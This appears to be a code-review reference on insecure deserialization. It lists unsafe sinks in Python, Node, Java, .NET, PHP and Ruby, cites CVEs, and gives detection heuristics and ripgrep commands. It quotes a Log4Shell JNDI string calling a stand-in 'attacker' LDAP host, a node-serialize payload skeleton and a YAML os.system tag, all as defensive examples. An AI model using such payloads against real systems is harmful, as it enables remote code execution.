# Deserialization Reference

Load when the diff touches `pickle`, `yaml.load`, `marshal`, `cloudpickle`, `joblib`, `dill`, `node-serialize`, `serialize-javascript`, Java `ObjectInputStream`, .NET `BinaryFormatter`, PHP `unserialize`, Jackson polymorphic deserialization, or Log4j pattern layouts.

The rule: if the bytes come from outside the trust boundary, the deserializer is an RCE primitive. The only question is whether the trust boundary is where the author thinks it is.

## Python

### pickle / cloudpickle / dill / joblib — always unsafe on untrusted input

```python
import pickle
obj = pickle.loads(request.data)   # RCE. No defenses available.
```

The pickle protocol allows `__reduce__` to return `(callable, args)`; on load the callable is invoked with args. `os.system`, `subprocess.Popen`, `eval`, anything importable.

- `cloudpickle.loads` — same.
- `joblib.load` — same (wraps pickle for ML models).
- `dill.loads` — same.
- `pandas.read_pickle` — same.

**ML model files are a live attack surface.** Picklescan CVE-2025-1716 pattern: an attacker uploads a poisoned `.pkl` / `.joblib` model and the serving code loads it. Any application that accepts model uploads and later calls `joblib.load` on them is RCE-as-a-service.

**Internal use**: pickle for module-level caches, worker IPC, Redis-backed buffers where the round-trip writer and reader are both your own code is fine. Sentry does this in `arroyo`, `buffer/redis`, `gzippeddict`, `nodestore`. See `references/sentry.md`.

Historical: **python-socketio GHSA-g8c6-8fjj-2r4m** — multi-server deployments pickled inter-server messages and `pickle.loads` ran on any message reaching the socket. Network-adjacent RCE.

### yaml — loader matters

- `yaml.load(x)` — default loader allows `!!python/object:os.system` tags. RCE.
- `yaml.load(x, Loader=yaml.Loader)` — explicit full loader. RCE.
- `yaml.load(x, Loader=yaml.FullLoader)` — pre-PyYAML 5.3.1 still allowed construction gadgets. CVE-2020-1747.
- `yaml.load(x, Loader=yaml.SafeLoader)` — safe. Restricted to primitive types.
- `yaml.safe_load(x)` — safe. Same as above.

**Any `yaml.load` call without an explicit `SafeLoader`** on a diff is a candidate finding. Check the PyYAML version if the form is `FullLoader` — pre-5.3.1 is vulnerable.

### marshal — never safe

`marshal.loads(request.data)` is RCE on untrusted bytes. Used historically for Python bytecode caching; never for user data.

## JavaScript / Node

### node-serialize — always unsafe

CVE-2017-5941. `unserialize()` calls `eval()` on any string-coerced IIFE. There is no safe way to use this library on untrusted input. Flag the dependency.

```ts
import unserialize from 'node-serialize';
const obj = unserialize(req.body);  // {"rce":"_$$ND_FUNC$$_function(){...}()"} executes.
```

Migration: `JSON.parse` for JSON; `cbor-js` or similar for binary.

### serialize-javascript — safer, but check version

Older versions had XSS / escape issues. Current versions are OK for serialization; deserialization should still be `JSON.parse` on the client.

### Prototype pollution → RCE

Prototype pollution can reach a code-execution sink. See `references/prototype-pollution.md`. The Handlebars CVE-2019-19919 chain is the canonical example: pollute `Object.prototype`, then template compilation picks up the polluted property as a "helper."

### Function / vm / eval

Not deserialization strictly, but often invoked during deserialization as a deliberate feature. See `references/eval.md`.

## Java

### Native serialization

`ObjectInputStream.readObject()` on attacker-controlled bytes is RCE if any "gadget chain" class is on the classpath. Commons-Collections, Spring, Groovy, Hibernate all historically provided gadgets.

**Log4Shell — CVE-2021-44228** is the most-exploited example: `${jndi:ldap://attacker/}` in a logged string triggered JNDI → remote class download → deserialization gadget → RCE. Fixed in log4j 2.17.1. Any `LogManager.getLogger().info(userString)` pre-patch is vulnerable.

**Spring4Shell — CVE-2022-22965**: Spring MVC data binding on JDK 9+ exposed `class.module.classLoader` via POJO setters, allowing attacker to repurpose Tomcat AccessLogValve to drop a webshell.

**Jackson polymorphic** — `@JsonTypeInfo(use = Id.CLASS)` or enabling default typing lets attacker specify the class. Gadget chains (C3P0, log4j JNDI, SpringAbstractBeanFactory, etc.) are well known. Current best practice: avoid default typing, use a validator/allowlist for subtype classes.

## .NET

`BinaryFormatter.Deserialize` — unsafe on untrusted bytes, deprecated in .NET 5+. Migration to `System.Text.Json` or DataContractSerializer with a `KnownType` allowlist.

`SoapFormatter`, `NetDataContractSerializer`, `ObjectStateFormatter` — same family.

## PHP

`unserialize($user_data)` — unsafe. PHP magic methods (`__wakeup`, `__destruct`, `__toString`) execute on deserialized objects; combined with available classes, produces RCE. The ecosystem has well-catalogued gadget chains.

## Ruby

`YAML.load` (pre-3.1.0) — same issue as PyYAML. `YAML.safe_load` is the safe variant. `Marshal.load` on untrusted is unsafe.

## Detection Heuristics

Questions to answer for every match:

1. **Does the byte/string source come from outside the trust boundary?** Request body, URL params, headers, webhook payloads, uploaded files, third-party API responses, DB fields an untrusted user could influence, message queues receiving from untrusted producers.
2. **Is the deserializer one of the always-unsafe ones?** `pickle.loads`, `yaml.load` (unsafe loader), `node-serialize.unserialize`, `BinaryFormatter`, `unserialize` (PHP), `Marshal.load` (Ruby), `ObjectInputStream.readObject`.
3. **Is there a schema/type validator in between?** Pydantic, Zod, class-validator, JSON Schema may narrow the input to primitives before deserialization, making it safe. Read the validator.
4. **Is the library version patched?** PyYAML 5.3.1+ fixes FullLoader. Log4j 2.17.1 fixes the JNDI path. Versions matter.

## False-Positive Traps

- `yaml.safe_load` is safe.
- `json.loads` and `JSON.parse` are safe (JSON does not execute).
- `pickle.loads` on a value written by the same application to trusted storage (ORM field, Redis with a trusted key) is internal round-trip, not untrusted deserialization.
- A validator schema between the HTTP body and the deserializer that restricts to primitive types is a defense.

## Diff Heuristics

1. New `pickle.loads` where the input traces to an external source.
2. `yaml.load` without `SafeLoader` or `yaml.safe_load`.
3. Any use of `node-serialize`, `dill`, `cloudpickle` on non-internal input.
4. Java code that calls `readObject` on a network stream or HTTP body.
5. `BinaryFormatter` in .NET code (deprecated regardless).
6. PHP `unserialize($user_*)`.
7. ML model loading (`joblib.load`, `pickle.load`, `torch.load`) from a user-supplied path or uploaded file.
8. Log statement with `%s` / format string that includes unchecked user data, on log4j pre-2.17.1.
9. `@JsonTypeInfo` or default-typing enabled in Jackson config.

## Verification Commands

```bash
# Python deserialization sinks
rg -n 'pickle\.loads?|cloudpickle\.loads?|joblib\.load|dill\.loads?|marshal\.loads?|yaml\.load[^_]' <file>

# Node
rg -n "require\(['\"]node-serialize['\"]\)|unserialize\(" <file>

# PHP
rg -n 'unserialize\(' <file>

# Java
rg -n 'readObject\(|ObjectInputStream' <file>

# Log4j
rg -n 'log4j' <file>
# Check version:
mvn dependency:tree | rg log4j  # or gradle equivalent

# ML
rg -n 'torch\.load|joblib\.load|pickle\.load|keras\.models\.load_model' <file>
```

## Recent CVEs for Reference

- CVE-2020-1747 — PyYAML FullLoader before 5.3.1.
- CVE-2017-5941 — node-serialize.
- CVE-2021-44228 — Log4Shell.
- CVE-2022-22965 — Spring4Shell.
- CVE-2019-19919 — Handlebars prototype pollution to RCE.
- CVE-2025-1716 — Picklescan (ML model pickle).
- GHSA-g8c6-8fjj-2r4m — python-socketio pickle across servers.
